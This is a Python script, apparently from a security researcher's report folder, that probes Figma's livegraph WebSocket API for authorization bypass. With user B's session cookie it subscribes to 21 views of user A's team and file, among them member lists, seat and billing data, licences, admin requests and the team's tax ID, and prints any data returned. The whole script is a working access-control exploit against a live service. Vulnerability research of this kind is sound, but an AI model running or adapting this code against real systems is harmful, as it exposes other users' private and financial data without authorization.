# -*- coding: utf-8 -*-
"""livegraph 越权测试 v2:B 身份(cookie)订阅 A 资源的高价值 view
单连接多订阅:消息按 mutations 内的 view 键区分
"""
import json, time, websocket, sys
sys.path.insert(0, 'D:/scan/figma_report')
from _figma_creds import UID_A, UID_B, FILE_A, TEAM_A, COOKIE_B

CLIENT_URL = 'https://www.figma.com/file/%s' % FILE_A
PLAN_A = 'cc6b6125-a07f-4d39-a54c-50ef65f33919'  # A 团队 planRecordId(从 TeamByIdForPlanView 泄露)

# (viewName, args, label)
TESTS = [
    ('UserMonetizationMetadata', {'userId': UID_A}, 'A用户monetization元数据'),
    ('MemberFlyoutInfoFromPlanUser', {'planParentId': TEAM_A, 'planParentType': 'team', 'targetUserId': UID_A}, 'A团队成员flyout资料'),
    ('MemberFlyoutInfoView', {'planId': PLAN_A, 'planType': 'team', 'targetUserId': UID_A}, 'A团队成员flyout资料v2'),
    ('SeatRequestFlyoutTeamUserView', {'targetUserId': UID_A, 'teamId': TEAM_A}, 'A团队seat请求用户'),
    ('TeamPeopleTableView', {'teamId': TEAM_A}, 'A团队成员表'),
    ('TeamMembersModalView', {'teamId': TEAM_A}, 'A团队成员modal'),
    ('StandaloneTeamMembersModalView', {'firstPageSize': 50, 'teamId': TEAM_A}, 'A团队成员分页'),
    ('ProjectsForTeam', {'teamId': TEAM_A, 'updatedAtTimestamp': 0}, 'A团队项目列表'),
    ('ColorPalettesForTeam', {'teamId': TEAM_A}, 'A团队色板'),
    ('TeamFileCountsByTeamId', {'teamId': TEAM_A}, 'A团队文件数'),
    ('TeamFileLimitsInfo', {'teamId': TEAM_A}, 'A团队文件限额'),
    ('PlanUserByTeamId', {'teamId': TEAM_A}, 'A团队plan用户'),
    ('SeatCountDataForPlan', {'planParentId': TEAM_A, 'planType': 'team'}, 'A团队seat数'),
    ('BillingTrialForResource', {'resourceId': TEAM_A, 'resourceType': 'team'}, 'A团队计费trial'),
    ('UserLicensesForFile', {'fileKey': FILE_A, 'userId': UID_A}, 'A文件A用户license'),
    ('AiMeterUsageView', {'fileKey': FILE_A}, 'A文件AI用量'),
    ('TeamRoles', {'teamId': TEAM_A}, 'A团队角色'),
    ('TeamSettings', {'teamId': TEAM_A}, 'A团队设置'),
    ('UserGroupsByPlan', {'filterProperty': 'name', 'firstPageSize': 50, 'planId': PLAN_A, 'queryString': '', 'refetchToken': None, 'sortOrder': 'alpha', 'sortProperty': 'name'}, 'A团队用户组'),
    ('TeamTaxIdView', {'teamId': TEAM_A}, 'A团队税号'),
    ('AdminRequestDashboardRowIds', {'filterParams': {}, 'planId': PLAN_A, 'planType': 'team'}, 'A团队admin请求'),
]

def run():
    url = ('wss://www.figma.com/api/livegraph?pv=1&userId=%s&anonUserId=&clientType=web'
           '&preload=%%7B%%7D&requestedProtocolVersion=2&clientUrl=%s&connectionType=initial&reconnect=0'
           % (UID_B, CLIENT_URL))
    ws = websocket.create_connection(url, timeout=10,
                                     header=['User-Agent: Mozilla/5.0', 'Cookie: ' + COOKIE_B])
    ws.send(json.dumps({'messageType': 'auth', 'clientType': 'web',
                        'args': {'userId': UID_B, 'anonymousUserId': None},
                        'tags': {'clientType': 'web', 'clientUrl': CLIENT_URL},
                        'clientRequestedVersion': 2}))
    time.sleep(0.4)
    for vn, args, label in TESTS:
        ws.send(json.dumps({'messageType': 'subscribe', 'viewName': vn,
                            'viewHash': 'abababababababababababababababab',
                            'loadType': 'initial', 'args': args}))
    msgs = []
    ws.settimeout(8)
    try:
        while True:
            msgs.append(ws.recv())
    except Exception:
        pass
    ws.close()
    return msgs

msgs = run()
print('total msgs:', len(msgs))
# 解析:找每个 view 的响应
for m in msgs:
    try:
        j = json.loads(m)
    except Exception:
        print('  RAW:', m[:200]); continue
    mt = j.get('messageType', '')
    if mt == 'viewSubscriptionFailed':
        print('[FAIL] %s' % str(j.get('errorCode')))
    elif mt == 'viewLoaded':
        print('[OK-load] %s' % j.get('viewName'))
    elif mt == 'denormalizedPendingMutations':
        for viewkey, payload in (j.get('mutations') or {}).items():
            print('[DATA] %s' % viewkey[:120])
            # 打印非空数据
            s = json.dumps(payload, ensure_ascii=False)
            if len(s) > 200 and '"initial":{}' not in s:
                print('    %s' % s[:800])
    elif mt not in ('authSuccess', 'subscriptionStatus', 'viewSubscribed'):
        print('[MSG]', m[:300])
